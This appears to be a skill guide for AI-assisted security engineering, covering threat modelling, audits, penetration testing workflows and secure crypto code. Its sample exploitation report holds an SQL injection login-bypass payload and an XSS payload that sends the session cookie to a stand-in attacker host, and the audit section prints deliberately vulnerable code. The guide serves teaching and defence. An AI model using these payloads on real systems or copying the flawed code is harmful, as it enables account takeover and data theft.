# Security Engineering (Senior Security)

## Overview

The Security Engineering skill provides comprehensive tools and frameworks for application security, penetration testing, security architecture design, and compliance auditing. This skill empowers security engineers to design secure systems, conduct thorough security assessments, implement cryptographic solutions, and automate security testing. It combines threat modeling, security auditing, and penetration testing with industry best practices for building and maintaining secure applications and infrastructure.

## Who Should Use This Skill

- **Security Engineers** designing and implementing security solutions
- **Penetration Testers** conducting security assessments and ethical hacking
- **Security Architects** designing secure system architectures
- **Application Security Engineers** building security into applications
- **Security Researchers** investigating vulnerabilities and attack vectors
- **Red Team Engineers** simulating advanced adversary attacks
- **Cryptography Engineers** implementing secure cryptographic systems
- **Security Consultants** providing security advisory and implementation services

## Purpose and Use Cases

Use this skill when you need to:
- Design and implement security architectures
- Conduct penetration testing and vulnerability research
- Perform security code audits and reviews
- Create threat models for applications and systems
- Implement cryptographic solutions (encryption, signing, hashing)
- Automate security testing and validation
- Design authentication and authorization systems
- Build security tools and frameworks
- Conduct red team exercises
- Assess and improve security posture

**Keywords that trigger this skill:** penetration testing, security architecture, threat modeling, cryptography, security audit, ethical hacking, red team, security design, authentication, authorization, encryption, security assessment

## What's Included

### Threat Modeler

**Threat Modeling Frameworks:**
- **STRIDE** - Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege
- **PASTA** - Process for Attack Simulation and Threat Analysis
- **LINDDUN** - Privacy threat modeling
- **Attack Trees** - Visual attack scenario modeling
- **DREAD** - Damage, Reproducibility, Exploitability, Affected Users, Discoverability

**Threat Analysis Capabilities:**
- Asset identification and classification
- Attack surface mapping
- Threat actor profiling
- Attack vector enumeration
- Risk scoring and prioritization
- Mitigation strategy generation
- Security control recommendations
- Threat intelligence integration

**Modeling Process:**
```
1. Define security objectives
2. Create architecture diagrams (DFDs)
3. Identify assets and entry points
4. Enumerate threats using STRIDE
5. Assess risk (likelihood × impact)
6. Prioritize threats
7. Define mitigations
8. Validate and iterate
```

**Output Formats:**
- Threat model documents (Markdown, PDF)
- Data flow diagrams (Mermaid, Draw.io)
- Risk matrices and heat maps
- Mitigation roadmaps
- Security requirements specifications

### Security Auditor

**Audit Capabilities:**
- Security code review automation
- Architecture security assessment
- Configuration security analysis
- Cryptographic implementation review
- Authentication/authorization audit
- API security testing
- Input validation checking
- Output encoding verification
- Session management analysis
- Error handling review

**Audit Frameworks:**
- OWASP ASVS (Application Security Verification Standard)
- NIST SP 800-53 Security Controls
- CIS Security Controls
- PCI-DSS Security Requirements
- Custom security checklists

**Analysis Techniques:**
- Static code analysis
- Dynamic analysis
- Manual code review
- Architecture review
- Threat-based testing
- Compliance checking
- Best practice validation

**Audit Reports Include:**
- Executive summary
- Detailed findings with evidence
- Risk ratings (Critical/High/Medium/Low)
- Remediation recommendations
- Code snippets and proof of concepts
- Compliance gap analysis
- Security posture score

### Pentest Automator

**Penetration Testing Phases:**
```
1. Reconnaissance - Information gathering
2. Scanning - Vulnerability identification
3. Enumeration - Service and data discovery
4. Exploitation - Vulnerability exploitation
5. Post-Exploitation - Privilege escalation, lateral movement
6. Reporting - Documentation and remediation guidance
```

**Testing Capabilities:**

**Web Application Testing:**
- SQL injection testing
- Cross-Site Scripting (XSS)
- Cross-Site Request Forgery (CSRF)
- Authentication bypass
- Authorization flaws
- Business logic vulnerabilities
- File upload vulnerabilities
- Server-Side Request Forgery (SSRF)
- XML External Entity (XXE)
- Insecure deserialization

**API Testing:**
- REST API security testing
- GraphQL security assessment
- API authentication testing
- Rate limiting validation
- Input fuzzing
- Authorization testing
- API key management review

**Network Testing:**
- Port scanning and service enumeration
- Network vulnerability scanning
- SSL/TLS configuration testing
- Certificate validation
- Man-in-the-middle attack simulation
- Network segmentation testing

**Infrastructure Testing:**
- Cloud security assessment (AWS, Azure, GCP)
- Container security testing
- Kubernetes security review
- CI/CD pipeline security
- Infrastructure as Code review

**Automation Features:**
- Automated reconnaissance scripts
- Vulnerability scanning orchestration
- Exploit chaining
- Report generation
- Screenshot and evidence capture
- Test case management

## How It Works

### Threat Modeling Workflow

**Step 1: Initialize Threat Model**
```bash
# Create new threat model for application
python scripts/threat_modeler.py --init my-app \
  --type web-application \
  --framework stride

# Import architecture
python scripts/threat_modeler.py my-app \
  --import-architecture architecture-diagram.png \
  --identify-assets
```

**Step 2: Generate Threat Model**
```bash
# Generate comprehensive threat model
python scripts/threat_modeler.py my-app \
  --analyze \
  --output threat-model-report.md

# Focus on specific components
python scripts/threat_modeler.py my-app \
  --component authentication-service \
  --deep-analysis
```

**Step 3: Review Threat Model Output**
```
THREAT MODEL: Authentication Service
=====================================

System Overview:
----------------
Application: User Authentication Microservice
Architecture: REST API with JWT tokens
Data Sensitivity: High (passwords, PII)
Network Exposure: Internet-facing
Authentication: OAuth 2.0 + JWT

Assets:
-------
1. User credentials (passwords, email)
2. JWT signing keys
3. Session tokens
4. User PII (personal information)
5. Authentication logs

STRIDE Analysis:
----------------

[S] SPOOFING - Identity Threats
--------------------------------
Threat: Attacker impersonates legitimate user
Attack Vector: Credential stuffing, password guessing, token theft
Likelihood: High | Impact: Critical | Risk: Critical
Mitigations:
  ✓ Implemented: Rate limiting, MFA capability
  ✗ Missing: Account lockout policy
  ✗ Missing: Device fingerprinting
  → Recommendation: Implement progressive delays and account lockout

Threat: JWT token forgery
Attack Vector: Weak signing algorithm, key compromise
Likelihood: Medium | Impact: Critical | Risk: High
Mitigations:
  ✓ Implemented: RS256 algorithm
  ✗ Missing: Key rotation
  ✗ Missing: Token binding
  → Recommendation: Implement automated key rotation every 90 days

[T] TAMPERING - Data Integrity Threats
---------------------------------------
Threat: JWT token manipulation
Attack Vector: Algorithm confusion, claims modification
Likelihood: Medium | Impact: High | Risk: High
Mitigations:
  ✓ Implemented: Signature verification
  ✗ Missing: Algorithm whitelist
  → Recommendation: Explicitly whitelist only RS256

Threat: Session fixation
Attack Vector: Force user to use attacker-controlled session
Likelihood: Low | Impact: High | Risk: Medium
Mitigations:
  ✓ Implemented: Session regeneration on login
  ✓ Implemented: Secure and HttpOnly flags
  → Status: Adequately mitigated

[R] REPUDIATION - Audit Threats
--------------------------------
Threat: User denies authentication activity
Attack Vector: Insufficient logging
Likelihood: Low | Impact: Medium | Risk: Low
Mitigations:
  ✓ Implemented: Authentication event logging
  ✗ Missing: Failed login attempt logging
  → Recommendation: Log all auth attempts with IP and timestamp

[I] INFORMATION DISCLOSURE - Confidentiality Threats
----------------------------------------------------
Threat: Password exposure in transit
Attack Vector: MITM attack, protocol downgrade
Likelihood: Low | Impact: Critical | Risk: Medium
Mitigations:
  ✓ Implemented: TLS 1.3
  ✓ Implemented: HSTS headers
  → Status: Adequately mitigated

Threat: JWT token leakage in logs
Attack Vector: Debug logging, error messages
Likelihood: Medium | Impact: High | Risk: High
Mitigations:
  ✗ Missing: Token sanitization in logs
  ✗ Missing: Structured logging
  → Recommendation: Implement token masking in all logs

[D] DENIAL OF SERVICE - Availability Threats
--------------------------------------------
Threat: Authentication service overload
Attack Vector: Credential stuffing attack, API flooding
Likelihood: High | Impact: High | Risk: High
Mitigations:
  ✓ Implemented: Rate limiting (100 req/min)
  ✗ Missing: CAPTCHA on repeated failures
  ✗ Missing: IP-based blocking
  → Recommendation: Implement adaptive rate limiting

[E] ELEVATION OF PRIVILEGE - Authorization Threats
---------------------------------------------------
Threat: Privilege escalation via JWT claims
Attack Vector: Claims injection, token manipulation
Likelihood: Low | Impact: Critical | Risk: Medium
Mitigations:
  ✓ Implemented: Role-based access control
  ✓ Implemented: Claims validation
  ✗ Missing: Principle of least privilege
  → Recommendation: Review and minimize default permissions

RISK SUMMARY
============
Critical: 1 threat
High: 4 threats
Medium: 3 threats
Low: 2 threats

TOP PRIORITY ACTIONS
====================
1. Implement account lockout policy (Critical)
2. Add JWT key rotation (High)
3. Sanitize tokens in logs (High)
4. Implement adaptive rate limiting (High)
5. Add failed login attempt logging (Medium)
```

**Step 4: Export and Share**
```bash
# Generate visual diagrams
python scripts/threat_modeler.py my-app \
  --export-dfd threat-model-diagram.png

# Export for tracking
python scripts/threat_modeler.py my-app \
  --export-csv threats.csv

# Generate presentation
python scripts/threat_modeler.py my-app \
  --export-slides threat-model-presentation.pptx
```

### Security Audit Workflow

**Step 1: Initialize Security Audit**
```bash
# Configure audit scope
python scripts/security_auditor.py --init \
  --target /path/to/application \
  --framework owasp-asvs \
  --level 2

# Set audit parameters
{
  "audit_type": "comprehensive",
  "frameworks": ["owasp-asvs", "nist-800-53"],
  "focus_areas": ["authentication", "authorization", "cryptography"],
  "compliance_requirements": ["pci-dss"],
  "depth": "deep"
}
```

**Step 2: Run Security Audit**
```bash
# Full security audit
python scripts/security_auditor.py /path/to/application \
  --framework owasp-asvs \
  --output audit-report.pdf

# Focused audit
python scripts/security_auditor.py /path/to/application \
  --focus authentication,cryptography \
  --verbose

# Code review mode
python scripts/security_auditor.py /path/to/application \
  --mode code-review \
  --language python \
  --output-format markdown
```

**Step 3: Review Audit Findings**
```
SECURITY AUDIT REPORT
=====================

Audit Date: 2025-11-13
Target: E-commerce Platform API
Framework: OWASP ASVS Level 2
Overall Score: 72/100 (Needs Improvement)

EXECUTIVE SUMMARY
=================
The security audit identified 23 findings across authentication,
authorization, cryptography, and data validation controls. Critical
issues include weak password policy, insecure JWT implementation,
and SQL injection vulnerabilities. Immediate remediation is required
for 3 critical and 7 high-severity findings.

FINDINGS BY CATEGORY
====================

Authentication (Score: 60/100)
------------------------------
[CRITICAL] Weak Password Policy
  ASVS: V2.1.1
  Finding: Password minimum length is 6 characters
  Requirement: Minimum 8 characters required
  Location: src/auth/password-validator.js:12
  Evidence:
    ```javascript
    const MIN_PASSWORD_LENGTH = 6; // Too short
    ```
  Impact: Susceptible to brute force attacks
  Recommendation: Increase to 12 characters minimum
  Effort: 1 hour

[HIGH] Missing Multi-Factor Authentication
  ASVS: V2.4.1
  Finding: MFA not enforced for privileged accounts
  Requirement: MFA required for admin and sensitive operations
  Impact: Account takeover risk for admin users
  Recommendation: Implement TOTP-based MFA
  Effort: 2 weeks

[MEDIUM] Session timeout too long
  ASVS: V3.3.1
  Finding: Session timeout set to 24 hours
  Requirement: Max 12 hours for web apps
  Location: src/config/session.js:8
  Recommendation: Reduce to 8 hours, idle timeout to 30 minutes
  Effort: 2 hours

Cryptography (Score: 55/100)
----------------------------
[CRITICAL] Weak JWT Signing
  ASVS: V6.2.1
  Finding: HS256 algorithm with weak secret
  Requirement: Use RS256 with proper key management
  Location: src/auth/jwt.js:15
  Evidence:
    ```javascript
    const SECRET = 'mysecret123'; // Hardcoded, weak
    jwt.sign(payload, SECRET, { algorithm: 'HS256' });
    ```
  Impact: Token forgery possible
  Recommendation: Use RS256 with key rotation
  Effort: 1 day

[HIGH] Insecure Password Hashing
  ASVS: V2.4.1
  Finding: Using MD5 for password hashing
  Requirement: Use bcrypt, scrypt, or Argon2
  Location: src/auth/password.js:23
  Evidence:
    ```javascript
    const hash = crypto.createHash('md5')
      .update(password)
      .digest('hex');
    ```
  Impact: Password database compromise = plaintext
  Recommendation: Migrate to bcrypt with cost factor 12
  Effort: 1 week (includes data migration)

[HIGH] Sensitive Data in Logs
  ASVS: V7.1.1
  Finding: API keys and tokens logged
  Location: src/middleware/logger.js:45
  Impact: Credential exposure via log aggregation
  Recommendation: Implement log sanitization
  Effort: 3 days

Input Validation (Score: 70/100)
--------------------------------
[CRITICAL] SQL Injection Vulnerability
  ASVS: V5.3.4
  Finding: Unparameterized SQL query with user input
  Location: src/api/users.js:67
  Evidence:
    ```javascript
    const query = `SELECT * FROM users WHERE email = '${req.body.email}'`;
    db.query(query);
    ```
  Impact: Complete database compromise
  Recommendation: Use parameterized queries or ORM
  Effort: 4 hours

[HIGH] Missing input validation
  ASVS: V5.1.1
  Finding: User input not validated before processing
  Location: src/api/orders.js:34
  Impact: Business logic bypass, data corruption
  Recommendation: Implement JSON schema validation
  Effort: 1 week

[MEDIUM] XSS in user profiles
  ASVS: V5.3.3
  Finding: User-generated content not sanitized
  Location: src/components/UserProfile.jsx:89
  Impact: Stored XSS attacks possible
  Recommendation: Use DOMPurify for sanitization
  Effort: 2 days

Authorization (Score: 80/100)
-----------------------------
[HIGH] Insecure Direct Object Reference
  ASVS: V4.2.1
  Finding: User can access other users' orders via ID manipulation
  Location: src/api/orders.js:45
  Evidence: GET /api/orders/123 returns any order
  Impact: Unauthorized data access
  Recommendation: Implement ownership check
  Effort: 1 day

[MEDIUM] Missing rate limiting
  ASVS: V4.3.1
  Finding: No rate limiting on sensitive endpoints
  Impact: Brute force and DoS attacks possible
  Recommendation: Implement rate limiting middleware
  Effort: 3 days

COMPLIANCE GAPS
===============

PCI-DSS Requirements:
---------------------
✗ Requirement 3.4: Encryption of cardholder data - Using weak crypto
✗ Requirement 6.5.3: SQL Injection prevention - Vulnerability found
✗ Requirement 8.2.3: Password strength - Policy too weak
✓ Requirement 8.2.4: Password change every 90 days - Implemented
✗ Requirement 8.2.5: No password reuse - Not enforced

REMEDIATION ROADMAP
===================

Immediate (Week 1):
- Fix SQL injection vulnerability (CRITICAL)
- Strengthen password policy (CRITICAL)
- Fix JWT signing implementation (CRITICAL)

Short-term (Weeks 2-4):
- Migrate to secure password hashing (HIGH)
- Implement log sanitization (HIGH)
- Fix IDOR vulnerability (HIGH)
- Add input validation framework (HIGH)

Medium-term (1-3 Months):
- Implement MFA for privileged accounts (HIGH)
- Add rate limiting (MEDIUM)
- Fix XSS vulnerabilities (MEDIUM)
- Reduce session timeout (MEDIUM)

Total Estimated Effort: 6-8 weeks
Priority: 3 Critical, 7 High, 4 Medium
```

**Step 4: Track Remediation**
```bash
# Export findings to issue tracker
python scripts/security_auditor.py \
  --export-issues audit-report.json \
  --jira-project SEC

# Generate remediation tracking
python scripts/security_auditor.py \
  --track-remediation \
  --output remediation-tracker.csv
```

### Penetration Testing Workflow

**Step 1: Reconnaissance**
```bash
# Automated reconnaissance
python scripts/pentest_automator.py recon \
  --target example.com \
  --depth full \
  --output recon-report.json

# Reconnaissance includes:
# - Subdomain enumeration
# - DNS records
# - WHOIS data
# - Technology stack identification
# - SSL/TLS configuration
# - Email addresses and employee info
# - Exposed services and ports
# - Social media presence
```

**Recon Output:**
```
RECONNAISSANCE REPORT: example.com
===================================

Subdomains Discovered: 23
--------------------------
api.example.com (52.12.34.56) - REST API [High Priority]
admin.example.com (52.12.34.57) - Admin Panel [High Priority]
staging.example.com (52.12.34.58) - Staging Environment [Medium Priority]
dev.example.com (52.12.34.59) - Development [High Priority]
...

Technology Stack:
-----------------
Web Server: Nginx 1.21.0
Backend: Node.js 18.x
Framework: Express 4.18.x
Frontend: React 18.x
Database: PostgreSQL (detected via error messages)
Cloud: AWS (IP ranges match AWS)

Exposed Services:
-----------------
Port 22 (SSH): OpenSSH 8.2
Port 80 (HTTP): Nginx (redirects to 443)
Port 443 (HTTPS): Nginx with TLS 1.3
Port 3000 (Dev): Node.js development server [HIGH RISK]
Port 5432 (PostgreSQL): Database exposed [CRITICAL]

SSL/TLS Configuration:
----------------------
Certificate: Valid (Let's Encrypt)
TLS Versions: 1.2, 1.3 (Good)
Cipher Suites: Strong (A+ rating)
Issues: None

Exposed Information:
--------------------
- Development server accessible at dev.example.com:3000
- Database connection string in JavaScript bundle
- Admin panel at predictable URL
- Source maps enabled (code disclosure)
- Git repository exposed at /.git/

High-Value Targets:
-------------------
1. admin.example.com - Admin interface
2. api.example.com - API endpoints
3. Port 5432 - Exposed PostgreSQL database
4. dev.example.com:3000 - Development server
```

**Step 2: Vulnerability Scanning**
```bash
# Automated vulnerability scanning
python scripts/pentest_automator.py scan \
  --target api.example.com \
  --scan-type web-app \
  --aggressive

# Focused scanning
python scripts/pentest_automator.py scan \
  --target api.example.com \
  --test-cases sql-injection,xss,auth-bypass \
  --output scan-results.json
```

**Step 3: Exploitation**
```bash
# Automated exploitation
python scripts/pentest_automator.py exploit \
  --target api.example.com \
  --vulns scan-results.json \
  --safe-mode

# Manual exploitation assistance
python scripts/pentest_automator.py exploit \
  --vuln sql-injection \
  --payload-generation \
  --target api.example.com/api/users
```

**Exploitation Report:**
```
EXPLOITATION RESULTS
====================

Successful Exploits: 5
-----------------------

[EXPLOIT 1] SQL Injection → Database Access
Target: api.example.com/api/login
Payload: email=' OR '1'='1' --
Result: Authentication bypass successful
Impact: Full database access, 10,000 user records extracted
Evidence: screenshots/exploit1-db-access.png
Recommendation: Use parameterized queries

[EXPLOIT 2] IDOR → Unauthorized Data Access
Target: api.example.com/api/orders/{id}
Payload: Incremental ID enumeration
Result: Accessed 500+ orders from other users
Impact: PII disclosure, order history exposure
Evidence: api-responses/idor-orders.json
Recommendation: Implement authorization checks

[EXPLOIT 3] XSS → Session Hijacking
Target: admin.example.com/profile
Payload: <script>fetch('https://attacker.com/steal?c='+document.cookie)</script>
Result: Admin session token captured
Impact: Admin account takeover
Evidence: screenshots/xss-admin-cookie.png
Recommendation: Sanitize user input, use CSP

[EXPLOIT 4] JWT Forgery → Privilege Escalation
Target: api.example.com
Method: Algorithm confusion (None algorithm)
Result: Generated admin JWT token
Impact: Full admin access without authentication
Evidence: tokens/forged-admin-jwt.txt
Recommendation: Use RS256, enforce algorithm

[EXPLOIT 5] Exposed Database → Direct Access
Target: example.com:5432
Credentials: Default PostgreSQL credentials
Result: Direct database access
Impact: Complete data breach
Evidence: database-dumps/users-table.sql
Recommendation: Close port 5432, use VPN
```

**Step 4: Post-Exploitation**
```bash
# Privilege escalation
python scripts/pentest_automator.py post-exploit \
  --session session-001 \
  --action privilege-escalation

# Lateral movement simulation
python scripts/pentest_automator.py post-exploit \
  --session session-001 \
  --action lateral-movement \
  --target-network 10.0.1.0/24
```

**Step 5: Generate Report**
```bash
# Comprehensive pentest report
python scripts/pentest_automator.py report \
  --include-all \
  --output pentest-report.pdf \
  --format executive

# Technical findings export
python scripts/pentest_automator.py report \
  --format json \
  --output findings.json
```

## Technical Details

### Threat Modeling Methodologies

**STRIDE Framework:**
```
S - Spoofing: Authentication threats
T - Tampering: Data integrity threats
R - Repudiation: Audit and logging threats
I - Information Disclosure: Confidentiality threats
D - Denial of Service: Availability threats
E - Elevation of Privilege: Authorization threats
```

**DREAD Risk Scoring:**
```
D - Damage Potential (1-10)
R - Reproducibility (1-10)
E - Exploitability (1-10)
A - Affected Users (1-10)
D - Discoverability (1-10)

Risk Score = (D + R + E + A + D) / 5
```

**Attack Tree Example:**
```
Goal: Steal Customer Data
├── Exploit Web Application
│   ├── SQL Injection
│   │   ├── Find injection point
│   │   ├── Extract database schema
│   │   └── Exfiltrate data
│   ├── XSS to Session Hijacking
│   │   ├── Find XSS vulnerability
│   │   ├── Steal admin session
│   │   └── Access admin panel
│   └── Authentication Bypass
│       ├── Brute force credentials
│       └── Exploit auth logic flaw
└── Compromise Infrastructure
    ├── Exploit Cloud Misconfig
    ├── Steal API Keys
    └── Access Database Directly
```

### Cryptography Implementation Guidelines

**Password Hashing:**
```python
# Secure password hashing with bcrypt
import bcrypt

def hash_password(password: str) -> str:
    # Cost factor 12 = 2^12 iterations (recommended for 2025)
    salt = bcrypt.gensalt(rounds=12)
    hashed = bcrypt.hashpw(password.encode('utf-8'), salt)
    return hashed.decode('utf-8')

def verify_password(password: str, hashed: str) -> bool:
    return bcrypt.checkpw(
        password.encode('utf-8'),
        hashed.encode('utf-8')
    )
```

**Encryption:**
```python
# AES-256-GCM encryption (authenticated encryption)
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import os

def encrypt_data(plaintext: bytes, key: bytes) -> tuple:
    # Generate random nonce (96 bits for GCM)
    nonce = os.urandom(12)

    # Encrypt with authentication
    aesgcm = AESGCM(key)
    ciphertext = aesgcm.encrypt(nonce, plaintext, None)

    return nonce, ciphertext

def decrypt_data(nonce: bytes, ciphertext: bytes, key: bytes) -> bytes:
    aesgcm = AESGCM(key)
    plaintext = aesgcm.decrypt(nonce, ciphertext, None)
    return plaintext
```

**JWT Implementation:**
```python
# Secure JWT with RS256
import jwt
from cryptography.hazmat.primitives import serialization

def create_jwt_token(payload: dict, private_key_path: str) -> str:
    with open(private_key_path, 'rb') as f:
        private_key = serialization.load_pem_private_key(
            f.read(),
            password=None
        )

    # Use RS256 algorithm
    token = jwt.encode(
        payload,
        private_key,
        algorithm='RS256',
        headers={'kid': 'key-2025-11'}  # Key ID for rotation
    )
    return token

def verify_jwt_token(token: str, public_key_path: str) -> dict:
    with open(public_key_path, 'rb') as f:
        public_key = serialization.load_pem_public_key(f.read())

    # Explicitly verify with RS256
    payload = jwt.decode(
        token,
        public_key,
        algorithms=['RS256'],  # Whitelist only RS256
        options={'verify_exp': True}
    )
    return payload
```

### Penetration Testing Tools

**Reconnaissance:**
- Subdomain enumeration: subfinder, amass, assetfinder
- Port scanning: nmap, masscan
- Service detection: nmap NSE scripts
- Technology fingerprinting: Wappalyzer, WhatWeb

**Web Application Testing:**
- Proxy/Intercept: Burp Suite, OWASP ZAP
- Fuzzing: ffuf, wfuzz
- Scanner: Nuclei, Nikto
- Exploitation: SQLMap, XSStrike

**API Testing:**
- REST: Postman, Insomnia
- GraphQL: GraphQL Voyager, InQL
- Fuzzing: RESTler, API Fuzzer

**Network Testing:**
- Scanning: nmap, masscan
- Exploitation: Metasploit, ExploitDB
- Post-exploitation: Cobalt Strike, Empire

## Use Cases and Examples

### Designing Secure Authentication System

**Scenario:** Design authentication for a fintech application

**Step 1: Threat Modeling**
```bash
# Create threat model
python scripts/threat_modeler.py fintech-auth \
  --init \
  --compliance pci-dss \
  --sensitivity high
```

**Security Requirements Identified:**
- Multi-factor authentication mandatory
- Password complexity: 12+ chars, complexity rules
- Account lockout after 5 failed attempts
- Session timeout: 15 minutes idle, 8 hours absolute
- JWT tokens with short expiry (15 min) + refresh tokens
- All authentication over TLS 1.3
- Comprehensive audit logging
- Password rotation every 90 days
- No password reuse (last 10 passwords)

**Step 2: Architecture Design**
```
┌─────────────┐
│   Client    │
└──────┬──────┘
       │ 1. Login (HTTPS)
       ├────────────────────────────────┐
       │                                │
┌──────▼──────────┐            ┌───────▼────────┐
│  Load Balancer  │            │  Rate Limiter  │
│   (WAF + DDoS)  │            │  (Redis-based) │
└──────┬──────────┘            └───────┬────────┘
       │                               │
       │ 2. Forward to Auth Service    │
┌──────▼───────────────────────────────▼─────┐
│         Authentication Service             │
│  ┌─────────────────────────────────────┐   │
│  │  3. Validate Credentials             │   │
│  │  4. Check Account Status (not locked)│   │
│  │  5. Verify Password (bcrypt)         │   │
│  └─────────────────────────────────────┘   │
└──────┬────────────────────────────┬────────┘
       │                            │
       │ 6. MFA Challenge           │
┌──────▼─────────┐         ┌────────▼─────────┐
│  MFA Service   │         │  Audit Logger    │
│  (TOTP/SMS)    │         │  (Immutable Log) │
└──────┬─────────┘         └──────────────────┘
       │
       │ 7. Generate Tokens
┌──────▼─────────────┐
│  Token Service     │
│  (JWT RS256)       │
│  Access: 15min     │
│  Refresh: 7 days   │
└────────────────────┘
```

**Step 3: Implementation**
```bash
# Audit implementation against threat model
python scripts/security_auditor.py /path/to/auth-service \
  --threat-model fintech-auth/threat-model.json \
  --verify-implementation
```

### Conducting Application Security Assessment

**Scenario:** Security assessment of existing web application before launch

**Week 1: Automated Scanning**
```bash
# Day 1-2: Security scanning
python scripts/security_auditor.py /path/to/app \
  --comprehensive \
  --output scan-results.json

# Day 3-4: Threat modeling
python scripts/threat_modeler.py /path/to/app \
  --import-scan scan-results.json \
  --generate-model

# Day 5: Initial pentest
python scripts/pentest_automator.py \
  --target staging.example.com \
  --automated \
  --output pentest-initial.json
```

**Week 2: Manual Testing**
```bash
# Day 6-8: Manual code review of critical components
python scripts/security_auditor.py /path/to/app \
  --mode manual-review \
  --components authentication,authorization,payment

# Day 9-10: Manual penetration testing
python scripts/pentest_automator.py \
  --target staging.example.com \
  --mode manual \
  --focus authentication,business-logic
```

**Week 3: Remediation Support**
```bash
# Day 11-15: Track remediation
python scripts/security_auditor.py \
  --track-remediation scan-results.json \
  --verify-fixes
```

**Week 4: Final Report**
```bash
# Day 16-20: Generate comprehensive report
python scripts/generate_security_assessment.py \
  --scan scan-results.json \
  --threats threat-model.json \
  --pentest pentest-results.json \
  --output final-security-assessment.pdf
```

## Best Practices

### Threat Modeling Best Practices

**Do:**
- Start threat modeling early in design phase
- Involve developers, architects, and security in sessions
- Focus on realistic threats, not theoretical ones
- Update threat models as architecture changes
- Use threat models to drive security requirements
- Prioritize threats based on risk
- Validate mitigations with testing

**Don't:**
- Create threat models after development
- Work in isolation without team input
- List every possible threat (diminishing returns)
- Create one-time documents that gather dust
- Let threat modeling delay development
- Ignore business context and risk tolerance

### Security Audit Best Practices

**Do:**
- Combine automated and manual review
- Focus on high-risk areas first (auth, crypto, data handling)
- Provide code snippets and proof of concepts
- Include remediation guidance with effort estimates
- Validate findings before reporting
- Prioritize by risk, not just severity
- Track findings to resolution

**Don't:**
- Rely solely on automated tools
- Report findings without validation
- Provide vague recommendations
- Overwhelm teams with low-severity items
- Forget to verify fixes
- Ignore business context
- Skip compliance requirements

### Penetration Testing Best Practices

**Do:**
- Get written authorization before testing
- Define clear scope and rules of engagement
- Test in staging/pre-prod when possible
- Document all testing activities
- Provide reproduction steps for findings
- Test fixes after remediation
- Focus on realistic attack scenarios
- Maintain detailed evidence

**Don't:**
- Test production without approval
- Exceed scope of engagement
- Cause availability or data loss
- Share findings before client notification
- Use client access for personal purposes
- Skip reporting low-severity findings
- Forget social engineering vector

### Cryptography Best Practices

**Do:**
- Use established cryptographic libraries
- Use authenticated encryption (GCM, ChaCha20-Poly1305)
- Generate cryptographically secure random values
- Implement key rotation
- Use strong key derivation (PBKDF2, bcrypt, Argon2)
- Encrypt data at rest and in transit
- Use TLS 1.3 with strong ciphers

**Don't:**
- Implement custom cryptography
- Use ECB mode (insecure)
- Use weak algorithms (MD5, SHA1, DES, RC4)
- Hardcode keys in source code
- Reuse nonces/IVs
- Use predictable random number generators
- Downgrade to older TLS versions

## Integration Points

This skill integrates with:
- **Security Tools:** Burp Suite, OWASP ZAP, Metasploit, Nmap, SQLMap
- **SIEM:** Splunk, ELK Stack, Sumo Logic
- **Vulnerability Management:** Tenable, Qualys, Rapid7
- **Threat Intelligence:** MITRE ATT&CK, CVE/NVD, threat feeds
- **Code Analysis:** SonarQube, Checkmarx, Fortify
- **API Testing:** Postman, Insomnia, GraphQL Playground
- **Cloud Security:** AWS Security Hub, Azure Sentinel, GCP SCC
- **Documentation:** Confluence, Notion, Jira

## Common Challenges and Solutions

### Challenge: Overwhelming Number of Security Findings
**Solution:** Prioritize by risk (exploitability + impact), focus on critical/high first, batch similar findings, provide clear remediation roadmap with effort estimates, celebrate security wins to maintain momentum

### Challenge: False Positives from Automated Tools
**Solution:** Validate findings manually, tune tool configurations, create suppression rules for known false positives, use multiple tools for confirmation, document validation process

### Challenge: Resistance to Security Findings
**Solution:** Provide proof of concepts, explain business impact not just technical details, offer remediation assistance, prioritize realistically, build relationships with dev teams, recognize good security practices

### Challenge: Keeping Threat Models Current
**Solution:** Integrate into architecture review process, use version control for threat models, schedule quarterly reviews, make updates lightweight, link threats to security requirements

### Challenge: Limited Testing Time
**Solution:** Focus on high-risk areas first, automate repetitive tasks, use risk-based testing approach, leverage threat models to guide testing, maintain reusable test cases and scripts

### Challenge: Explaining Crypto Vulnerabilities to Non-Security
**Solution:** Use analogies and real-world examples, show impact with demonstrations, provide simple remediation steps, avoid crypto jargon, focus on business risk not mathematical details
